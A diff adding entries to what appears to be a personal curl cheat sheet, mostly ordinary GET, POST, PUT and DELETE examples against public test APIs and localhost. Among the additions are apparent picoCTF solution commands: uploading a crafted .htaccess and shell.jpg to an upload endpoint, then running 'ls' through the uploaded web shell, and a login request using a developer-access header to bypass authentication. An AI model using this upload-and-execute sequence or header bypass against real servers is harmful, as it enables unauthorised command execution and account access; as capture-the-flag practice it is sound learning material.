@@ -820,6 +820,11 @@ wget -r ftp://test.rebex.net --user=demo --password=password
 ```bash
 # Download file
 curl https://example.com/file.txt
+# 
+curl -F "image=@.htaccess" http://amiable-citadel.picoctf.net:55117/upload.php
+curl -F "image=@shell.jpg" http://amiable-citadel.picoctf.net:55117/upload.php
+curl "http://amiable-citadel.picoctf.net:55117/images/shell.jpg?cmd=ls"
+
 
 # Save to file
 curl https://example.com/file.txt -o filename.txt
@@ -827,14 +832,50 @@ curl https://example.com/file.txt -o filename.txt
 # Follow redirects
 curl -L https://example.com/redirect
 
+# 
+curl -I https://example.com/
+
+# 
+curl -k https://self-signed.badssl.com/
+
+# Send GET request
+curl https://dummy.restapiexample.com/api/v1/employees
+curl https://dummy.restapiexample.com/api/v1/employees/1
+curl https://dummy.restapiexample.com/api/v1/employees/1 curl https://dummy.restapiexample.com/api/v1/employees/2
+curl https://dummy.restapiexample.com/api/v1/employees/[1-5]
+
 # Send POST request
-curl -X POST -d "data=value" https://example.com/api
+curl -X POST http://amiable-citadel.picoctf.net:59505/login \ 
+  -H "Content-Type: application/json" \
+  -H "X-Dev-Access: yes" \
+  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
+# Forn url content type
+curl -d "name=Benj&age=23" https://dummy.restapiexample.com/api/v1/create
+
+# Send PUT request
+curl -X PUT https://dummy.restapiexample.com/api/v1/update/1 -H "Content-Type: application/json" -d '{"name":"John","age":"23"}'
+
+# Send DELETE request
+curl -X DELETE https://dummy.restapiexample.com/api/v1/delete/1 
 
 # Include headers
-curl -H "Content-Type: application/json" https://example.com/api
+curl -H "Content-Type: application/json" https://dummy.restapiexample.com/api
 
 # Download with progress bar
 curl -# https://example.com/file.txt -o file.txt
+
+# 
+curl --header "Host: example.com" http://127.0.0.1:8000
+
+# 
+curl --data "name=John&age=23" http://127.0.0.1:8000
+
+
+curl --resolve navek.org:443:127.0.0.1 https://navek.org/
+
+--connect-to
+
+smtp
 ```
 
 ### ping - Test Network Connectivity
